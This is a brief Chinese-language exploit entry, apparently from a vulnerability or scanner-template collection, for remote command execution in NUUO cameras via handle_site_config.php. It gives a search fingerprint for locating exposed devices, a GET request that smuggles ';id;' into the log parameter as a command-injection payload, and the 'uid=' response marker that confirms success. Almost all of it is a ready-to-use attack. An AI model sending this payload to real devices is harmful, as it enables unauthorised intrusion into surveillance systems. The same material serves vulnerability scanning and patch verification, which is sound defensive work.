# NUUO摄像机handle_site_config.php存在远程命令执行漏洞

NUUO ｜ 命令执行 ｜ —
- **指纹**：`body="www.nuuo.com/eHelpdesk.php"`
- **请求**：`GET /handle_site_config.php?log=;id; HTTP/1.1`
- **响应特征**：200 uid=